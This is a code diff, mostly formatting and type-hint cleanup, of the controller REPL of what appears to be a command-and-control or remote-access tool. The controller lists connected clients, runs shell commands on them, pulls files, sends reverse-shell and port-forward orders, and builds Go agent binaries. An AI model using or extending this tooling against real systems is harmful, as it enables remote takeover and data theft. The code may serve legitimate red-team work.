@@ -7,24 +7,24 @@ import json
 import os
 import shlex
 import ssl
-import sys
 import subprocess
+import sys
 from datetime import datetime
-from typing import Any, Dict, Optional, Tuple
+from typing import Any
 
-from .utils.common import write_frame, read_frame
-from .utils.go_builder import build_go_clients
+from .utils.common import read_frame, write_frame
 from .utils.controller_ui import (
     UI,
+    print_clients,
     print_error,
-    print_queued,
     print_exec,
     print_list,
-    print_session,
-    print_clients,
-    print_server_health,
+    print_queued,
     print_server_config,
+    print_server_health,
+    print_session,
 )
+from .utils.go_builder import build_go_clients
 
 __version__ = "4.0"
 
@@ -71,9 +71,7 @@ class NoExitArgumentParser(argparse.ArgumentParser):
         raise ValueError(message)
 
 
-def build_repl_parser() -> Tuple[
-    argparse.ArgumentParser, Dict[str, argparse.ArgumentParser]
-]:
+def build_repl_parser() -> tuple[argparse.ArgumentParser, dict[str, argparse.ArgumentParser]]:
     p = NoExitArgumentParser(prog=">>")
     sub = p.add_subparsers(dest="cmd")
 
@@ -82,21 +80,23 @@ def build_repl_parser() -> Tuple[
     sp.add_argument("client", help="Client ID to use")
 
     sp = sub.add_parser("unuse", help="Clear the active client (or only if it matches)")
-    sp.add_argument(
-        "client", nargs="?", help="Optional client ID to unuse (must match current)"
-    )
+    sp.add_argument("client", nargs="?", help="Optional client ID to unuse (must match current)")
 
     # regular commands (client optional in REPL; will use active context)
     sub.add_parser("clients", help="List connected clients")
 
     sp = sub.add_parser("ping", help="Ping a client and display round-trip time")
     sp.add_argument("--client", required=False)
-    sp.add_argument("--timeout", type=float, default=5.0, help="Seconds to wait for PONG (default: 5)")
+    sp.add_argument(
+        "--timeout", type=float, default=5.0, help="Seconds to wait for PONG (default: 5)"
+    )
 
     sp = sub.add_parser("list", help="List directory on client")
     sp.add_argument("--client", required=False)
     sp.add_argument("--path", default=".")
-    sp.add_argument("--no-wait", action="store_true", help="Queue the order without waiting for result")
+    sp.add_argument(
+        "--no-wait", action="store_true", help="Queue the order without waiting for result"
+    )
     sp.add_argument(
         "--timeout", type=float, default=10.0, help="Seconds to wait for result (default: 10)"
     )
@@ -104,7 +104,9 @@ def build_repl_parser() -> Tuple[
     sp = sub.add_parser("ls", help="List directory on client")
     sp.add_argument("--client", required=False)
     sp.add_argument("--path", default=".")
-    sp.add_argument("--no-wait", action="store_true", help="Queue the order without waiting for result")
+    sp.add_argument(
+        "--no-wait", action="store_true", help="Queue the order without waiting for result"
+    )
     sp.add_argument(
         "--timeout", type=float, default=10.0, help="Seconds to wait for result (default: 10)"
     )
@@ -128,9 +130,7 @@ def build_repl_parser() -> Tuple[
     )
     sp.add_argument("--shell", action="store_true", help="Run via shell")
     sp.add_argument("--cwd", help="Working directory on client")
-    sp.add_argument(
-        "--timeout", type=float, default=30.0, help="Seconds to wait for command"
-    )
+    sp.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait for command")
 
     sp = sub.add_parser("session", help="Fetch session info from client")
     sp.add_argument("--client", required=False)
@@ -150,7 +150,12 @@ def build_repl_parser() -> Tuple[
     sp.add_argument("--arch", default="amd64", choices=["amd64", "arm64"])
     sp.add_argument("--agent-path", default="", help="Path to custom agent source")
     sp.add_argument("--build-tls", action="store_true", help="Bake TLS=true into the client binary")
-    sp.add_argument("--build-tls-fingerprint", default="", metavar="HEX", help="Bake TLS fingerprint into the client binary (implies --build-tls)")
+    sp.add_argument(
+        "--build-tls-fingerprint",
+        default="",
+        metavar="HEX",
+        help="Bake TLS fingerprint into the client binary (implies --build-tls)",
+    )
 
     # server-status (REPL)
     sub.add_parser("server-status", help="Check the server's health status")
@@ -185,14 +190,17 @@ def build_repl_parser() -> Tuple[
     sp = sub.add_parser("add-agent-token", help="Register a new agent auth token on the server")
     sp.add_argument("--token", required=True, help="Token to register")
     sp.add_argument(
-        "--port", type=int, default=None,
+        "--port",
+        type=int,
+        default=None,
         help="Bind token exclusively to this agent port (default: add to global set)",
     )
 
     sp = sub.add_parser("add-agent-port", help="Open a new agent listening port on the server")
     sp.add_argument("--port", type=int, required=True, help="Port number to open")
     sp.add_argument(
-        "--token", default=None,
+        "--token",
+        default=None,
         help="Bind a token exclusively to this port (optional; uses global tokens if omitted)",
     )
 
@@ -225,20 +233,25 @@ async def run_repl(args) -> None:
     )
     ui.welcome(__version__, args.host, args.port)
 
-    current_client: Optional[str] = None
+    current_client: str | None = None
     session_start = datetime.now()
     command_count = 0
 
     # Pre-configure TLS once for the whole session
-    _tls    = getattr(args, "tls", False)
+    _tls = getattr(args, "tls", False)
     _tls_fp = getattr(args, "tls_fingerprint", "") or ""
 
-    async def _send(header: dict, payload: bytes = b"") -> Tuple[Dict[str, Any], bytes]:
+    async def _send(header: dict, payload: bytes = b"") -> tuple[dict[str, Any], bytes]:
         """Thin wrapper that forwards TLS settings to every admin_send call."""
         try:
             return await admin_send(
-                args.host, args.port, args.auth_token, header, payload,
-                tls=_tls, tls_fingerprint=_tls_fp,
+                args.host,
+                args.port,
+                args.auth_token,
+                header,
+                payload,
+                tls=_tls,
+                tls_fingerprint=_tls_fp,
             )
         except (OSError, ConnectionError) as e:
             ui.error(f"Cannot reach server at {args.host}:{args.port} — {e}")
@@ -247,8 +260,12 @@ async def run_repl(args) -> None:
     # Verify server is reachable and token is accepted before entering the REPL.
     try:
         probe, _ = await admin_send(
-            args.host, args.port, args.auth_token, {"action": "clients"},
-            tls=_tls, tls_fingerprint=_tls_fp,
+            args.host,
+            args.port,
+            args.auth_token,
+            {"action": "clients"},
+            tls=_tls,
+            tls_fingerprint=_tls_fp,
         )
     except (OSError, ConnectionError) as e:
         ui.error(f"Cannot connect to server at {args.host}:{args.port} — {e}")
@@ -305,7 +322,7 @@ async def run_repl(args) -> None:
             ui.error("No command parsed. Type 'help'.")
             continue
 
-        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
+        def _resolve_client(flag_value: str | None) -> str | None:
             return flag_value or current_client
 
         # ---- context ----
@@ -355,13 +372,15 @@ async def run_repl(args) -> None:
                 ui.show_no_client_error()
                 continue
             wait = not ns.no_wait
-            resp, payload = await _send({
-                "action": "list",
-                "target_id": target,
-                "path": ns.path,
-                "wait": wait,
-                "timeout": ns.timeout,
-            })
+            resp, payload = await _send(
+                {
+                    "action": "list",
+                    "target_id": target,
+                    "path": ns.path,
+                    "wait": wait,
+                    "timeout": ns.timeout,
+                }
+            )
             if wait:
                 print_list(ui, ns.path, resp, payload)
             else:
@@ -373,12 +392,14 @@ async def run_repl(args) -> None:
             if not target:
                 ui.show_no_client_error()
                 continue
-            resp, _ = await _send({
-                "action": "pull",
-                "target_id": target,
-                "src": ns.src,
-                "dest": ns.dest,
-            })
+            resp, _ = await _send(
+                {
+                    "action": "pull",
+                    "target_id": target,
+                    "src": ns.src,
+                    "dest": ns.dest,
+                }
+            )
             if resp.get("type") == "QUEUED":
                 print_queued(ui, resp)
                 ui.info("File will arrive in server storage once the client responds.")
@@ -426,14 +447,16 @@ async def run_repl(args) -> None:
                 cmd_value = json.loads(cmd_value)
             except Exception:
                 pass
-            resp, payload = await _send({
-                "action": "exec",
-                "target_id": target,
-                "cmd": cmd_value,
-                "shell": ns.shell,
-                "cwd": ns.cwd,
-                "timeout": ns.timeout,
-            })
+            resp, payload = await _send(
+                {
+                    "action": "exec",
+                    "target_id": target,
+                    "cmd": cmd_value,
+                    "shell": ns.shell,
+                    "cwd": ns.cwd,
+                    "timeout": ns.timeout,
+                }
+            )
             print_exec(ui, target, resp, payload)
             continue
 
@@ -442,11 +465,13 @@ async def run_repl(args) -> None:
             if not target:
                 ui.show_no_client_error()
                 continue
-            resp, payload = await _send({
-                "action": "session_info",
-                "target_id": target,
-                "timeout": ns.timeout,
-            })
+            resp, payload = await _send(
+                {
+                    "action": "session_info",
+                    "target_id": target,
+                    "timeout": ns.timeout,
+                }
+            )
             print_session(ui, target, resp, payload)
             continue
 
@@ -459,11 +484,13 @@ async def run_repl(args) -> None:
                 f"Start your listener on {ui.c(ns.controller_addr, 'cyan')} "
                 f"before sending — client dials immediately."
             )
-            resp, _ = await _send({
-                "action": "reverse_shell",
-                "target_id": target,
-                "controller_addr": ns.controller_addr,
-            })
+            resp, _ = await _send(
+                {
+                    "action": "reverse_shell",
+                    "target_id": target,
+                    "controller_addr": ns.controller_addr,
+                }
+            )
             if resp.get("type") == "QUEUED":
                 print_queued(ui, resp)
             else:
@@ -493,12 +520,14 @@ async def run_repl(args) -> None:
                 print_error(ui, resp)
                 continue
             ui.info(f"Upload queued: {ui.c(filename, 'cyan')} -> {ui.c(target, 'cyan')}")
-            resp, _ = await _send({
-                "action": "port_forward",
-                "target_id": target,
-                "filename": filename,
-                "connect_args": ns.connect_args,
-            })
+            resp, _ = await _send(
+                {
+                    "action": "port_forward",
+                    "target_id": target,
+                    "filename": filename,
+                    "connect_args": ns.connect_args,
+                }
+            )
             if resp.get("type") == "QUEUED":
                 print_queued(ui, resp)
             else:
@@ -527,20 +556,24 @@ async def run_repl(args) -> None:
             continue
 
         if cmd == "server-exec":
-            resp, payload = await _send({
-                "action": "server_exec",
-                "cmd": ns.command,
-                "timeout": ns.timeout,
-            })
+            resp, payload = await _send(
+                {
+                    "action": "server_exec",
+                    "cmd": ns.command,
+                    "timeout": ns.timeout,
+                }
+            )
             print_exec(ui, "server", resp, payload)
             continue
 
         if cmd == "add-agent-token":
-            resp, _ = await _send({
-                "action": "add_agent_token",
-                "agent_token": ns.token,
-                "port": ns.port,
-            })
+            resp, _ = await _send(
+                {
+                    "action": "add_agent_token",
+                    "agent_token": ns.token,
+                    "port": ns.port,
+                }
+            )
             if resp.get("type") == "OK":
                 if resp.get("scope") == "port":
                     ui.success(
@@ -554,16 +587,17 @@ async def run_repl(args) -> None:
             continue
 
         if cmd == "add-agent-port":
-            resp, _ = await _send({
-                "action": "add_agent_port",
-                "port": ns.port,
-                "agent_token": ns.token,
-            })
+            resp, _ = await _send(
+                {
+                    "action": "add_agent_port",
+                    "port": ns.port,
+                    "agent_token": ns.token,
+                }
+            )
             if resp.get("type") == "OK":
                 binding = resp.get("token_binding", "global")
                 ui.success(
-                    f"Agent port :{ns.port} opened  "
-                    f"[muted]({binding} token binding)[/muted]"
+                    f"Agent port :{ns.port} opened  [muted]({binding} token binding)[/muted]"
                 )
             else:
                 print_error(ui, resp)
@@ -604,11 +638,16 @@ def start_server(args):
     cmd = [
         sys.executable,
         os.path.join(os.path.dirname(__file__), "server.py"),
-        "--host", args.host,
-        "--admin-port", str(args.port),
-        "--ports", str(agent_port),
-        "--admin-token", args.auth_token,
-        "--agent-token", args.auth_token,
+        "--host",
+        args.host,
+        "--admin-port",
+        str(args.port),
+        "--ports",
+        str(agent_port),
+        "--admin-token",
+        args.auth_token,
+        "--agent-token",
+        args.auth_token,
     ]
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -626,14 +665,14 @@ async def amain():
     ap.add_argument("--host", default="127.0.0.1")
     ap.add_argument("--port", type=int, required=True)
     ap.add_argument("--auth-token", required=True)
-    ap.add_argument(
-        "--start-srv", action="store_true", help="Start server with given parameters"
-    )
+    ap.add_argument("--start-srv", action="store_true", help="Start server with given parameters")
 
     # TLS flags
     ap.add_argument("--tls", action="store_true", help="Connect to server using TLS")
     ap.add_argument(
-        "--tls-fingerprint", default="", metavar="HEX",
+        "--tls-fingerprint",
+        default="",
+        metavar="HEX",
         help="Expected SHA-256 fingerprint of the server TLS cert (hex, colons optional); implies --tls",
     )
 
